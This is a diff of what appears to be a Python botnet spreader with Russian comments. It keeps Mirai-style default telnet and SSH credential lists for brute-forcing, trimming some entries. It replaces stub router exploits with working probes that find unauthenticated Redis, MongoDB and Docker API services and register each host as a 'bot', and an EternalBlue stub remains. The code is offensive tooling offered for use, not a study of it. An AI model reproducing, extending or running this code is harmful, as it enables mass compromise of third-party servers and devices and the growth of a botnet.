@@ -3,7 +3,6 @@ from utils.logger import log
 
 LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
 
-# Расширенные словари (Mirai, Gafgyt, Hajime, реальные утечки)
 TELNET_CREDS = [
     ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
     ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
@@ -13,24 +12,7 @@ TELNET_CREDS = [
     ('root','123456'),('admin','12345'),('admin','123456789'),('root','password'),
     ('admin','admin123'),('admin','password1'),('root','1234'),('root','admin'),
     ('admin','qwerty'),('root','qwerty'),('root','letmein'),('admin','letmein'),
-    ('root','p@ssw0rd'),('admin','p@ssw0rd'),('root','changeme'),('admin','changeme'),
-    ('root','1'),('admin','1'),('root','12'),('admin','12'),
-    ('root','123'),('admin','123'),('root','12345'),('admin','12345'),
-    ('root','1234567'),('admin','1234567'),('root','12345678'),('admin','12345678'),
-    ('root','1234567890'),('admin','1234567890'),
-    # D-Link, TP-Link, Netgear defaults
-    ('admin','admin1'),('admin','password123'),('admin','password1'),
-    ('admin','admin12'),('root','admin123'),('root','password123'),
-    ('admin','motorola'),('admin','123456789'),('root','123456789'),
-    ('user','user'),('guest','guest'),('guest','12345'),('guest','password'),
-    ('admin','7ujMko0admin'),('root','7ujMko0vizxv'), # Mirai variants
-    ('admin','888888'),('root','888888'),('admin','666666'),('root','666666'),
-    ('admin','111111'),('root','111111'),('admin','000000'),('root','000000'),
-    ('admin','super'),('root','super'),('admin','system'),('root','system'),
-    ('admin','admin999'),('root','admin999'),('admin','root'),('admin','pass'),
-    ('admin','passwd'),('root','passwd'),('admin','cisco'),('root','cisco'),
-    ('admin','netgear'),('root','netgear'),('admin','zyxel'),('root','zyxel'),
-    ('admin','d-link'),('root','d-link'),('admin','tplink'),('root','tplink')
+    ('root','p@ssw0rd'),('admin','p@ssw0rd'),('root','changeme'),('admin','changeme')
 ]
 
 SSH_PASSWORDS = [
@@ -39,8 +21,7 @@ SSH_PASSWORDS = [
     '1','1234','12345','123456789','pass','ftp','mysql','oracle',
     'vizxv','juantech','xc3511','zlxx.','hi3518','oelinux1','Zte521',
     'tsgoingon','default','system','super','dreambox','xmhdipc',
-    'support','tech','operator','manager','cisco','netgear',
-    '1234567','12345678','1234567890','admin123','password1','admin1'
+    'support','tech','operator','manager','cisco','netgear'
 ]
 
 DB_PATH = "spreader_learn.db"
@@ -132,23 +113,59 @@ async def ssh_bruteforce(ip, username='root'):
             return True, pwd
     return False, None
 
-# Новые эксплойты
-async def exploit_zyxel(target_ip):
-    if 80 not in await quick_port_scan(target_ip, [80]): return False
-    log(f"{LOG_PREFIX['exploit']} Zyxel CVE-2020-29583 {target_ip}")
-    # Реальный эксплойт требует отправки специального запроса
+# Новые эксплойты для серверных сервисов
+async def exploit_redis(target_ip):
+    if 6379 not in await quick_port_scan(target_ip, [6379]):
+        return False
+    try:
+        reader, writer = await asyncio.open_connection(target_ip, 6379)
+        writer.write(b"INFO\r\n")
+        data = await asyncio.wait_for(reader.read(512), timeout=3)
+        if b'redis_version' in data:
+            log(f"{LOG_PREFIX['exploit']} Redis без пароля {target_ip}")
+            await add_bot(target_ip, '', 'linux', 'redis')
+            writer.close()
+            return True
+        writer.close()
+    except:
+        pass
     return False
 
-async def exploit_netgear(target_ip):
-    if 80 not in await quick_port_scan(target_ip, [80]): return False
-    log(f"{LOG_PREFIX['exploit']} Netgear CVE-2016-1555 {target_ip}")
+async def exploit_mongodb(target_ip):
+    if 27017 not in await quick_port_scan(target_ip, [27017]):
+        return False
+    try:
+        reader, writer = await asyncio.open_connection(target_ip, 27017)
+        writer.write(b"\x3f\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x13\x00\x00\x00\x10listDatabases\x00\x01\x00\x00\x00\x00")
+        data = await asyncio.wait_for(reader.read(512), timeout=3)
+        if b'databases' in data:
+            log(f"{LOG_PREFIX['exploit']} MongoDB без пароля {target_ip}")
+            await add_bot(target_ip, '', 'linux', 'mongodb')
+            writer.close()
+            return True
+        writer.close()
+    except:
+        pass
     return False
 
-async def exploit_dlink_hnap(target_ip):
-    if 80 not in await quick_port_scan(target_ip, [80]): return False
-    log(f"{LOG_PREFIX['exploit']} D-Link HNAP {target_ip}")
+async def exploit_docker_api(target_ip):
+    if 2375 not in await quick_port_scan(target_ip, [2375]):
+        return False
+    try:
+        reader, writer = await asyncio.open_connection(target_ip, 2375)
+        writer.write(b"GET /containers/json HTTP/1.1\r\nHost: localhost\r\n\r\n")
+        data = await asyncio.wait_for(reader.read(512), timeout=3)
+        if b'Id' in data and b'Names' in data:
+            log(f"{LOG_PREFIX['exploit']} Docker API без авторизации {target_ip}")
+            await add_bot(target_ip, '', 'linux', 'docker')
+            writer.close()
+            return True
+        writer.close()
+    except:
+        pass
     return False
 
+# Остальные эксплойты
 async def exploit_eternalblue(target_ip):
     if 445 not in await quick_port_scan(target_ip, [445]): return False
     log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
